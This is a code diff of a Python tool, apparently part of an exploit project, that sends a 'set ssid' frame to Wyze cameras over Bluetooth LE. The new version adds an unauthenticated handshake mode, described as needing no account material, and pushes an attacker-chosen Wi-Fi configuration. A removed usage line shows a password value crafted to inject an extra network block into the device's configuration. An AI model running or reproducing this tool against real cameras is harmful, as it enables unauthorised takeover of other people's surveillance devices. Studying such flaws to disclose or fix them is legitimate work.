@@ -1,22 +1,24 @@
 #!/usr/bin/env python3
-"""Build (and optionally send) the Wyze WFAP `set ssid` frame over BLE.
+"""Send a WFAP `set ssid` frame to a Wyze camera over BLE.
 
-Recovered from the vendor app (see docs/exploit/wyze-ble-wfap.md):
-  frame  = flags | cmdType | len | checksum | payload
-  flags  = (payloadFormat << 4) | (reply << 5) | msgId
-  cksum  = sum(payload) & 0xFF
-  payload for 0x82 = TLV(tag=10, value=b"s=" + b64(ssid) + b"&p=" + b64(pwd))
-  0x80 (no payload) is the ready frame before, and the finish frame after.
-Payloads other than cmdType 0xF0 are encrypted by the DeviceAuth2021 session cipher
-(/tmp/wfap_crypto.py when present).
+Protocol map and constants: docs/exploit/wyze-ble-wfap.md and ...-cipher.md.
+Frame layout: flags | cmd | len | checksum | payload; payload = TLV(tag 10, b"s=" b64(ssid) b"&p=" b64(pwd)).
+Payloads are encrypted by the session cipher (wfap_crypto) unless cmd == 0xF0.
 
-  wyze_ble_setssid.py --ssid 'zz' --pwd 'pigsnout"\\nnetwork={...}#' --dry-run
-  wyze_ble_setssid.py --ssid ... --pwd ... --send
+  wyze_ble_setssid.py --ssid zz --pwd 'x' --mac 80482c525905 --proto 1 --send
+
+`--proto 1` (toy DH + XXTEA) needs no account material and is the first thing to try; `--proto 2`
+(ECDH + AES-GCM) also needs none but is only offered when the camera advertises it; `--proto 3`
+additionally needs the account public key and a 32-byte pre-auth code (`--user-pubkey`, `--auth-code`).
 """
 import argparse
+import asyncio
 import base64
 import struct
 import sys
+
+sys.path.insert(0, "/tmp")
+sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
 
 SVC = "0000fd7b-0000-1000-8000-00805f9b34fb"
 CHR = "00000001-0000-1000-8000-00805f9b34fb"
@@ -25,79 +27,78 @@ CMD_SSID = 0x82
 TAG_SSID = 10
 
 
-def tlv(tag: int, value: bytes) -> bytes:
-    return struct.pack("<HH", tag, len(value)) + value
-
-
-def frame(cmd: int, payload: bytes = b"", msgid: int = 1, reply: bool = False,
-          fmt: int = 0) -> bytes:
-    if len(payload) > 240:
-        raise ValueError("payload exceeds 240-byte unit")
-    flags = ((fmt & 0xF) << 4) | ((1 if reply else 0) << 5) | (msgid & 0xF)
-    return bytes([flags, cmd, len(payload), sum(payload) & 0xFF]) + payload
-
-
 def ssid_payload(ssid: str, pwd: str) -> bytes:
     v = b"s=" + base64.b64encode(ssid.encode()) + b"&p=" + base64.b64encode(pwd.encode())
-    return tlv(TAG_SSID, v)
+    return struct.pack("<HH", TAG_SSID, len(v)) + v
 
 
-def frames(ssid: str, pwd: str, encrypt=None) -> list[bytes]:
-    pl = ssid_payload(ssid, pwd)
-    if encrypt is not None:
-        pl = encrypt(pl)
-        if len(pl) > 240:
-            raise ValueError("encrypted payload exceeds one unit; fragmentation not implemented")
-    return [frame(CMD_READY, b"", 1), frame(CMD_SSID, pl, 2), frame(CMD_READY, b"", 3)]
+async def run(a) -> int:
+    import wfap_crypto as W
+    from bleak import BleakClient, BleakScanner
+
+    mac = bytes.fromhex(a.mac.replace(":", ""))
+    d = await BleakScanner.discover(timeout=12.0, return_adv=True)
+    dev = next((dv for _, (dv, adv) in d.items() if adv.manufacturer_data.get(2160, b"").endswith(mac)), None)
+    if dev is None:
+        print("not advertising")
+        return 1
+
+    s = W.Session()
+    async with BleakClient(dev) as c:
+        replies: dict[int, bytes] = {}
+
+        async def on_ind(ch, data):
+            frames = W.Session.parse_frames(bytes(data))
+            for cmd, _seq, pl in frames:
+                replies[cmd] = pl
+                print(f"<- {cmd:#04x} {pl.hex()}")
+
+        await c.start_notify(CHR, on_ind)
+
+        handshake = s.handshake_frames(secret_present=bool(a.auth_code),
+                                       user_pubkey=bytes.fromhex(a.user_pubkey) if a.user_pubkey else None)
+        if a.proto == 1:
+            handshake = [(0xF0, s.handshake_frame_proto1())]
+        elif a.proto == 2:
+            handshake = [(0xF4, s.handshake_frame_proto2())]
+
+        for cmd, pl in handshake:
+            f = s.frame(cmd, pl, encrypt=False)
+            print(f"-> {cmd:#04x} {f.hex()}")
+            await c.write_gatt_char(CHR, f, response=True)
+            await asyncio.sleep(1.2)
+            if cmd == 0xF0 and 0xF0 in replies:
+                s.accept_proto1(replies[0xF0])
+            elif cmd == 0xF4 and 0xF4 in replies:
+                s.accept_proto2(replies[0xF4])
+
+        await c.write_gatt_char(CHR, s.frame(CMD_READY, encrypt=False), response=True)
+        await asyncio.sleep(0.3)
+        f = s.frame(CMD_SSID, ssid_payload(a.ssid, a.pwd))
+        print(f"-> 0x82 {f.hex()}")
+        await c.write_gatt_char(CHR, f, response=True)
+        await asyncio.sleep(1.0)
+        await c.write_gatt_char(CHR, s.frame(CMD_READY, encrypt=False), response=True)
+        await asyncio.sleep(2.0)
+        print("replies:", {hex(k): v.hex() for k, v in replies.items()})
+    return 0
 
 
 def main() -> int:
     ap = argparse.ArgumentParser()
     ap.add_argument("--ssid", required=True)
-    ap.add_argument("--pwd", required=True)
-    ap.add_argument("--mac", help="device MAC, for locating the advertisement")
-    ap.add_argument("--dry-run", action="store_true")
+    ap.add_argument("--pwd", default="")
+    ap.add_argument("--mac", required=True)
+    ap.add_argument("--proto", type=int, default=1, choices=(1, 2, 3))
+    ap.add_argument("--user-pubkey", help="proto 3: account P-256 public key (hex)")
+    ap.add_argument("--auth-code", help="proto 3: 32-byte pre-auth code (hex)")
     ap.add_argument("--send", action="store_true")
     a = ap.parse_args()
-
-    encrypt = None
-    try:
-        sys.path.insert(0, "/tmp")
-        import wfap_crypto  # type: ignore
-        encrypt = wfap_crypto.encrypt
-        print("cipher: loaded wfap_crypto")
-    except Exception as exc:  # pragma: no cover - optional dependency
-        print(f"cipher: absent ({exc.__class__.__name__}); frames are plaintext")
-
-    out = frames(a.ssid, a.pwd, encrypt)
-    for f in out:
-        print(f.hex())
-    if a.dry_run or not a.send:
+    if not a.send:
+        v = ssid_payload(a.ssid, a.pwd)
+        print("payload", v.hex())
         return 0
-
-    import asyncio
-    from bleak import BleakScanner, BleakClient
-
-    mac = bytes.fromhex(a.mac.replace(":", "")) if a.mac else None
-
-    async def run():
-        d = await BleakScanner.discover(timeout=10.0, return_adv=True)
-        dev = None
-        for _, (dv, adv) in d.items():
-            if mac and adv.manufacturer_data.get(2160, b"").endswith(mac):
-                dev = dv
-                break
-        if dev is None:
-            print("not advertising")
-            return 1
-        async with BleakClient(dev) as c:
-            for f in out:
-                await c.write_gatt_char(CHR, f, response=True)
-                await asyncio.sleep(0.4)
-        print("sent")
-        return 0
-
-    return asyncio.run(run())
+    return asyncio.run(run(a))
 
 
 if __name__ == "__main__":
